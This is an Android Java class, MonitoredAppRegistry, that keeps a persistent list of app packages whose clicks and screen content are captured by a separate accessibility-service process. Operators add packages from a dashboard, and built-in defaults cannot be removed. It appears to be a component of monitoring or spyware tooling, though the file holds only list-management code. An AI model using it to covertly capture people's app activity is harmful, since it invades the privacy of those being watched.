package com.task.tusker.commands;

import android.content.Context;
import android.util.Log;
import com.task.tusker.utils.Constants;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.Set;

/**
 * MonitoredAppRegistry — the single source of truth for which packages are monitored.
 *
 * <h3>Why this is file-backed rather than in-memory</h3>
 * <ul>
 *   <li>The accessibility service runs in its own process
 *       ({@code android:process=":accessibility"}), so an in-memory set added by
 *       the dashboard command is invisible to the code that actually gates
 *       capture.</li>
 *   <li>{@code SharedPreferences} multi-process mode is deprecated and removed
 *       on modern Android, so it cannot be relied on for this.</li>
 *   <li>A JSON file in the app's private storage is re-read by both processes
 *       and survives a process kill, so a package added from the dashboard is
 *       still monitored after a reboot.</li>
 * </ul>
 *
 * <p>The monitored set is the union of two sources:
 * <ol>
 *   <li>the built-in defaults in {@link Constants#MONITORED_PACKAGES}, which
 *       cannot be removed at runtime, and</li>
 *   <li>operator-added packages persisted in the registry file.</li>
 * </ol>
 *
 * <p>{@link #isMonitored} runs on the hot path (once per click event and per
 * window-state change), so it guards the disk stat behind a short TTL instead
 * of hitting the filesystem on every event.
 */
public final class MonitoredAppRegistry {

    private static final String TAG = "MonitoredRegistry";

    private static final String STORE_FILE = ".monitored.json";

    /** Re-check the file at most this often. Keeps the hot path stat-free. */
    private static final long RELOAD_TTL_MS = 250L;

    private static volatile MonitoredAppRegistry instance;

    private final Context context;
    private final File   storeFile;

    /** Guards {@link #added} and the file write. */
    private final Object lock = new Object();

    private volatile Set<String> added = Collections.emptySet();
    private volatile long   lastCheckedMs = 0L;

    private MonitoredAppRegistry(Context context) {
        this.context   = context.getApplicationContext();
        this.storeFile = new File(this.context.getFilesDir(), STORE_FILE);
        reload(true);
    }

    /** Per-process singleton. Safe to call from any thread. */
    public static MonitoredAppRegistry get(Context context) {
        MonitoredAppRegistry local = instance;
        if (local == null) {
            synchronized (MonitoredAppRegistry.class) {
                local = instance;
                if (local == null) {
                    local = new MonitoredAppRegistry(context);
                    instance = local;
                }
            }
        }
        return local;
    }

    // ── Query ───────────────────────────────────────────────────────────────

    /**
     * Whether {@code pkg} is monitored — either a built-in default or added by
     * the operator. This is the gate used for click capture and UI snapshots.
     */
    public boolean isMonitored(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        if (isDefault(pkg)) return true;
        reload(false);
        return added.contains(pkg);
    }

    /** True when {@code pkg} comes from the compile-time defaults list. */
    public static boolean isDefault(String pkg) {
        if (pkg == null) return false;
        for (String p : Constants.MONITORED_PACKAGES) {
            if (p.equals(pkg)) return true;
        }
        return false;
    }

    /** Every monitored package: defaults first, then operator-added ones. */
    public Set<String> list() {
        reload(true);
        Set<String> out = new LinkedHashSet<>();
        Collections.addAll(out, Constants.MONITORED_PACKAGES);
        out.addAll(added);
        return out;
    }

    /** Operator-added packages only (excludes the compile-time defaults). */
    public Set<String> listAdded() {
        reload(true);
        return new LinkedHashSet<>(added);
    }

    // ── Mutation ────────────────────────────────────────────────────────────

    /**
     * Add a package to the monitored set and persist it.
     *
     * @return true if it is monitored now (false only if the name was rejected)
     */
    public boolean add(String pkg) {
        String clean = sanitize(pkg);
        if (clean == null) return false;
        synchronized (lock) {
            Set<String> next = new LinkedHashSet<>(added);
            next.add(clean);
            added = Collections.unmodifiableSet(next);
            persist();
        }
        Log.i(TAG, "Monitoring " + clean + " (total " + list().size() + ")");
        return true;
    }

    /**
     * Remove an operator-added package. Built-in defaults cannot be removed —
     * they live in Constants — so {@link #isMonitored} keeps returning true for
     * them and this reports false.
     *
     * @return true if the package was actually removed
     */
    public boolean remove(String pkg) {
        String clean = sanitize(pkg);
        if (clean == null) return false;
        synchronized (lock) {
            if (!added.contains(clean)) return false;
            Set<String> next = new LinkedHashSet<>(added);
            next.remove(clean);
            added = Collections.unmodifiableSet(next);
            persist();
        }
        Log.i(TAG, "Stopped monitoring " + clean);
        return true;
    }

    // ── Internals ───────────────────────────────────────────────────────────

    /**
     * Accept only plausible Java package names. Rejecting anything else keeps
     * the value safe to use as a directory name and stops a typo from
     * silently creating a package that can never match a real app.
     */
    static String sanitize(String pkg) {
        if (pkg == null) return null;
        String s = pkg.trim();
        if (s.isEmpty() || s.length() > 255) return null;
        if (!s.matches("[A-Za-z][A-Za-z0-9_]*(\\.[A-Za-z0-9_]+)+")) return null;
        return s;
    }

    /**
     * Re-read the store file if it changed. {@code force} skips the TTL, which
     * callers use when they are about to enumerate or mutate the set.
     */
    private void reload(boolean force) {
        long now = System.currentTimeMillis();
        if (!force && now - lastCheckedMs < RELOAD_TTL_MS) return;
        lastCheckedMs = now;
        if (!storeFile.isFile()) {
            added = Collections.emptySet();
            return;
        }
        try {
            String raw = new String(java.nio.file.Files.readAllBytes(storeFile.toPath()),
                    "UTF-8");
            if (raw.trim().isEmpty()) {
                added = Collections.emptySet();
                return;
            }
            JSONArray arr = new JSONArray(raw);
            Set<String> next = new LinkedHashSet<>();
            for (int i = 0; i < arr.length(); i++) {
                String clean = sanitize(arr.optString(i, ""));
                if (clean != null) next.add(clean);
            }
            added = Collections.unmodifiableSet(next);
        } catch (Exception e) {
            // A corrupt or unreadable store must not break capture — fall back
            // to whatever we last loaded successfully.
            Log.w(TAG, "reload failed: " + e.getMessage());
        }
    }

    private void persist() {
        try {
            File tmp = new File(storeFile.getAbsolutePath() + ".tmp");
            try (FileOutputStream fos = new FileOutputStream(tmp, false)) {
                JSONArray arr = new JSONArray();
                arr.put(new JSONArray(added));
                // Build the JSON explicitly — JSONArray(Collection) would nest it.
                JSONArray flat = new JSONArray();
                for (String p : added) flat.put(p);
                fos.write(flat.toString().getBytes("UTF-8"));
                fos.flush();
                fos.getFD().sync();
            }
            if (!tmp.renameTo(storeFile)) {
                Log.w(TAG, "persist rename failed — store not updated");
                tmp.delete();
                return;
            }
            // Make the rename visible to the other process immediately.
            lastCheckedMs = 0L;
            reload(true);
        } catch (Exception e) {
            Log.e(TAG, "persist failed: " + e.getMessage());
        }
    }
}
